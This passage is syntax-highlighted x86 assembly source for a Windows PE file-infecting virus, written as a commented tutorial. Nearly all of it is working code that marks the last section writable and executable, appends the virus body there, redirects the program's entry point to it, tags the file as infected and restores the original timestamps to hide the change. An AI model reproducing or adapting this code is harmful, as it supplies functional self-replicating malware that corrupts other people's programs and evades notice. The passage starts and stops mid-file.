</span><span class="sc1">;;  (Directory Table) +                              ;;</span><span class="sc0">
</span><span class="sc1">;;  (Number of Directories) * (Directory Size) +     ;;</span><span class="sc0">
</span><span class="sc1">;;  (Number of Sections - 1) * (Section header size) ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;;      The Directory size is 8.                     ;;</span><span class="sc0">
</span><span class="sc1">;;      The Section Header size is 28h.              ;;</span><span class="sc0">
</span><span class="sc1">;;      The pointer to the Directory Table is 78h    ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0">            </span><span class="sc1">; Set [CWE] flags (CODE)</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0">            </span><span class="sc1">; Set [CWE] flags (EXECUTABLE)</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">            </span><span class="sc1">; Set [CWE] flags (WRITABLE)</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; The flags are very important, They tell the       ;;</span><span class="sc0">
</span><span class="sc1">;; loader that the section now has executable code   ;;</span><span class="sc0">
</span><span class="sc1">;; and it is writable                                ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; EAX = size of raw data in this section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldrawsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Save it</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">viruslen</span><span class="sc0">              </span><span class="sc1">; Increase virtual size</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Update ImageBase                                  ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; Get new size in EAX</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; + section rva</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; The size of raw data is the actual size of the    ;;</span><span class="sc0">
</span><span class="sc1">;; data in the section, The virtual size is the one  ;;</span><span class="sc0">
</span><span class="sc1">;; we must increase with our virus size, Now after   ;;</span><span class="sc0">
</span><span class="sc1">;; the increasing, lets check how much did we mess   ;;</span><span class="sc0">
</span><span class="sc1">;; the file align, To do that we divide the new size ;;</span><span class="sc0">
</span><span class="sc1">;; to the filealign value and we get as a reminder   ;;</span><span class="sc0">
</span><span class="sc1">;; the number of bytes to pad                        ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; Get new size in EAX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; ECX = File alignment</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Get remainder in EDX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; ECX = File alignment</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">; Number of bytes to pad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; Save it</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now size of raw data = number of bytes to pad     ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; Get current VirtualSize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; EAX = SizeOfRawdata padded</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; Set new SizeOfRawdata</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now size of raw data = old virtual size +         ;;</span><span class="sc0">
</span><span class="sc1">;; number of bytes to pad                            ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newrawsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Save it</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; The virus will be at the end of the section, In   ;;</span><span class="sc0">
</span><span class="sc1">;; order to find its address we have the following   ;;</span><span class="sc0">
</span><span class="sc1">;; formula                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;; VirtualAddress + VirtualSize - VirusLength        ;;</span><span class="sc0">
</span><span class="sc1">;;      + RawSize = VirusStart                       ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; Get VirtualAddress</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Add VirtualSize, Rawsize</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">viruslen</span><span class="sc0">                       </span><span class="sc1">; Subtract the size of virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; EAX = new EIP, and save it</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Here we compute with how much did we increase     ;;</span><span class="sc0">
</span><span class="sc1">;; the size of raw data                              ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldrawsize</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Original SizeOfRawdata</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newrawsize</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; New SizeOfRawdata</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Increase in size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">incrawsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; Save increase value</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Compute the new file size                         ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; File offset of section raw data</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newrawsize</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Add size of new raw data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newfilesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; EAX = new filesize, and save it</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now prepare to copy the virus to the host, The    ;;</span><span class="sc0">
</span><span class="sc1">;; formulas are                                      ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;; Address to copy to = Map Address +                ;;</span><span class="sc0">
</span><span class="sc1">;;                      Last Section Address +       ;;</span><span class="sc0">
</span><span class="sc1">;;                      Last Section Virtual Size -  ;;</span><span class="sc0">
</span><span class="sc1">;;                      Virus Length                 ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;; Address to copy from = the start                  ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; File offset of section raw data</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; Add rawsize of section</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">viruslen</span><span class="sc0">                       </span><span class="sc1">; Subtract the virus size from it</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Align in memory to map address</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Location to copy the virus to</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusStart</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Location to copy the virus from</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">viruslen</span><span class="sc0">                       </span><span class="sc1">; Number of bytes to copy</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">; Copy all the bytes</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now, lets alter furthur the PE header by marking  ;;</span><span class="sc0">
</span><span class="sc1">;; the new IP, increasing the total size of the      ;;</span><span class="sc0">
</span><span class="sc1">;; files image with the increasing of the last       ;;</span><span class="sc0">
</span><span class="sc1">;; section                                           ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; ESI = Address of PE header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newip</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Get value of new EIP in EAX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; Write it to the PE header</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Now, lets mark the file as infected               ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'MS'</span><span class="sc0">              </span><span class="sc1">; Mark file as infected</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; And thats how you infect a file by increasing the ;;</span><span class="sc0">
</span><span class="sc1">;; last section and appending to it :)               ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;; Lets see what we have been doing all that time in ;;</span><span class="sc0">
</span><span class="sc1">;; some short steps                                  ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Locate PE header                           ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Locate Directory Table at 78h              ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Locate last section's header address       ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Increase the size of raw data              ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Increase the virtual size                  ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Append the virus to the end                ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Locate the new IP                          ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Mark the new IP                            ;;</span><span class="sc0">
</span><span class="sc1">;;     -) Increase the size of image                 ;;</span><span class="sc0">
</span><span class="sc1">;;                                                   ;;</span><span class="sc0">
</span><span class="sc1">;; After you have infected the file its time that    ;;</span><span class="sc0">
</span><span class="sc1">;; you start cleaning after yourself *LOL* meaning   ;;</span><span class="sc0">
</span><span class="sc1">;; you have to close what you have opened and unmap  ;;</span><span class="sc0">
</span><span class="sc1">;; whatever you mapped before and any other stuff    ;;</span><span class="sc0">
</span><span class="sc1">;; like that                                         ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; The first thing is to unmap the view of the file  ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">UnmapView</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; The next step is to close the map handle          ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">CloseMap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Then we start closing the file, First we must     ;;</span><span class="sc0">
</span><span class="sc1">;; restore it's time                                 ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ftcreation</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetFileTime</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; In order to properly close the file we must set   ;;</span><span class="sc0">
</span><span class="sc1">;; its EOF at the exact end of file, So first we     ;;</span><span class="sc0">
</span><span class="sc1">;; move the pointer to the end and set the EOF       ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; First we must set the file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; Pointer at the end of file (that is the beginning + new file size)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newfilesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetFilePointer</span><span class="sc4">]</span><span class="sc0">

